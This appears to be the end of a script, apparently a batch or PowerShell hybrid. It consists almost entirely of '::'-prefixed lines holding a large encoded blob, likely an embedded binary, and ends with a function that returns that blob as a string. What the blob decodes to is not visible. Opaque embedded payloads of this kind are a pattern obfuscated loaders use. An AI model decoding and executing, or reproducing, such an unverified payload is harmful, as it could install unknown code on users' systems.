::6kG3LXaXVF7lN$YdBNgkX{Kocpim5VpFFHTQI_F0H]H0Qp|1h7z8gDLtEm&;AKV.9X)e.+TTZ#@G@G1AADjTHXCnpNpim5VOMBV$t-s!P)suoBU924K31^C;)AMo[Xepe8pim5VOu#jRt-s!P)suoBUcowK3{{48AKXxz|5O0n)An|p
::t-s4.g/}_=p4G]64g!PC9Q$=wUt[.TU9^B86lf(wmBNF{621M&!]{eK1Fiu7p4G]U4g4I_9wC=DAezs}T1O[_Dv}fpADlJwc^AkV9FAcoO6|DSG}-0lP$CfZ~b!NVCTyx9=#}|7l4xs20-o8rx.E$@7x1hg709R7YyC~IG,=$6p.?q9
::TA(JCXWU$-TTZ&9OT=hRtuA@k)AEP#H[B&bp4G]D4;+3Yc/vmHc[11o;~v=)p|0eR.-e;jAKSnD)T3F+3C0wQ9T@BPAAT]E1&U@Zp.^Qj.-e;jAKSnD)T)#kAVu|()2tO;Ucf3-U0uR;X73F@GF2rG=cs1j~TnR1~jDa{p([0IUw2+W
::X7hz.6c3}AX7-jAX5MAs!18]QX$252!18#t!fnDKWQsD{OmCQSp.)XhO6Jc{XDU(6O62c[nkOy+~RL.^O62MV~R55I~RnT^G})?U~R5~6X)95f~.BTXrDi9DX$4UtVN@pR~7)aIp.=QUX]c]lpib5f~TL)xzJW}B^);9h~RL.H~kfqt
::^{3]o~RL.H~kUV=X)_6,Vhl$$i2Vg8pJUEV7J,e_ezLEI?Z11q6@6#W[XEpY-]27~U,pdPLS|O7;nkA[{&=Zh#6hf-oY=k8E7rp15~L!z{F{Jvy+_MZJa??EiZ&/swZv(3;Zm?qeQ4i4PPWxW{oqA&QNcYHg-u=;!c8XHvW9I^!p=}k
::sSu9^!6]|b#mWAk.nP3UL#ta|7CCY.7CCQ_~T),;uQPczOax--p4G]V4;QXBXfoMvpim5VGa&uY9T};wA7U4XAAQ_xP=;G/p|Ga)Q]ktJAKXs@;__vTp4G][41zMJ9wC=DAezs}}om~{AK^.VtE9EAg/}_=p4G]U4gXeS9wC=DAezs}
::T1O[_Dv}fpADlJ?}JQ+qX7u}I4D$JN~c1?b}gT_$!azl7~~~O#X)_6,9pF[vcYZH|~Tn]w7Ca](s@i$(=V]4yPX}fQXfpTiVhl$$i2VgXHg[yKX;xIB=V]4yPX}fTXd}L2/D|O&{4SKnD-SM,B4}7D;5H_!=p_&)3t/5ddqPFEXaX4s
::OaO,P=cs1jGy&V-Xy7JA7LeIT5zEVbpTLLi0Hyh6U|~(euyBYN[JI9=aGal9OxfCB=Y[4e$0t},vyjscJ5fp)X{Kocpim5VpFFHTQI_F0H]H0Qp|1h7z8gDLtEm&;AKV.9X)e.+TTZ#@G@G1AADjTHXCnpNpim5VOMBV$t-s!P)suoB
::U924K31^C;)AMo[Xd_appim5V~(b_=t-s!P)suoBUt6HEcqOnH9Q^kU|drq-!18)|~hr@n~~Uo8.Nvi6cqS(o~~~~pDq79#Ucb+yrk7_q;;Z@7yJ)+w|@84^+,~8+nJ)MkHwzIL{zyHgGF2rG=cs1j~z$H[pWgjat,A@81&|p+LD6?^
::utROMwqr]Ve/$h(v$rcEP_jbTu!sGZRES^7Y,+@SDb}7L7X#k#B$LNT55(_0@h9PBe(LbvrCMcU5-;MfivHQ[hASuaZy(kC!no/s&!tRj[r#Di9#&3DIIOk)wX0?KjP9hW3?7!r6!J!wzfVm=vRCr6dr,7t-P&LT&}!8(BE/Sd9CAe9
::p+pih)6t1kv[ZDF231jrxWZN{NIQEvi)bFnYj5}|lF1)P8Z1rDWqt91&{Mj[C]|YYK]3dGYYSt,rj2!7M}[Kkq837=Jy4q@BZ[TIn|p26h{9YEgfmoxFuJD3e1ut0$UQ[Q^3}Fq~~OPpQo=DsTRWuNQ@XxF/YQZd|HyRO/YQ$Cm$@6{
::~~~~~SLdN4~~~Op~~~Op~~~~~~~~Op~~~~~M}8oL~~~~~p./3P~RR6G~~~~~~~~~~~~~~~~~6gG~~Gi().OzStLZGZts-2OtLqw=cYM|PA@U/$AotfQNSmt^~~p_vX3Td1X3Td1!S^w3!tm2^!SagN~T0]eAo)xaAb{QYA@UFl|HySH
::AGe1]~~~~~WMb!a3wl|l2S7D=cCvtt~~~~~DgGI#~T0&+tLqw=cYM;bcY}C#9KJZ=tLZsu).Op^Ao)h^~~~~~~~~~~X3Qj{~T0&+tLqw=cYM{[cY}LZ3wSyaAo)h^~~~~~XLRNUX3Tl;XLRNU!HF|a1v]EW~T0r-A@UfhcY}LZA@Us)
::2S]6!9D(g3cY[S!~~~~~gn{Q$~T0dycY}@29D(;A}ZAOsAbfVL3Rte&tsE^))/b|9~~~~~DgGI#~T0dycY}@29D(;AQbNFz9DkNTcY}v]9D(T72tDAJ~~~~~~~~~~DgGI#~T0,F3Rte&tsERWA@Us)2SYistLqw=cY}^79D(g3cY[S!
::~~~~~MvAn;~T0iw3R2pjc1iLu9KJ^Z|HySHAGe1]~~~~~TRY_[3R2V_MEf3Fc1?8~Ao)ej/g~Hb3wS-&~~~~~!Sa4e~T0iw3R2pjc1iLu9KJ^ZTRY_[3R2V_tLZH#A@4h|XLRNUX3Tl;XLRNUX3Q8vsbiO@~T0]eAo)xaAGe1]A@Ufh
::3wo!@~~~~~}nr[e~~OPp9D(T7m$9gH2S7GY/YTRVcCvL=~~~~~1v]w]~~Gkb3Rtq7A@UIj2S]EA).Op^Ao)h^~~~~~~~sOlB@y8g2L,yB3ChwMA3^9PD+ejFcab~wc/1i?Bjj}Dmuga]U3qjMA]dXEAKX1=grt.3gJXd8O.x{T)8$[(
::259V7ADz;[Bjhc,A3Qn$t#bO+)pq}29wC=DAezs29wY6)9T}.T)(-@eAVVTwcy@P;Tf}Q,tE9EugarMggJP(YUTRdN3CEW)/^HghU)P{0A$9wf)Lq9_)8/EiAVV$QAD~=GAKSnD)z+~9Asb;YA8SbK1~YW2UTxd=B3W8A)Lq[TWk[o3
::UTxd=UTRdec^Q58);8b8|nl/ytEP@yc^=O3O}JY}UTxd=U@jrJ3Yun})2eb#W_8tg)AMo[.uHth2L,u;WPW7vgj+4KA$Sw}c^tV9)I#g#9FtIHBjjnq2n{D/U0MyKO}JY}UTxd+X}!RA)I1R.c&yxjt,U61caM&FBFVncUTxd+X}|Sm
::)Lq[TWk[o3UTRdp)3[q))9N9lA{pJQB0!1{)8$[(25c[&O6!HU~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~sZjFsb?kzGfFkU8?HB$VHDfk|yFgK#7c[T~UMd18Sj#.-fa.xGCTS_R[@ew_0]4z~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'
    Return $S
}
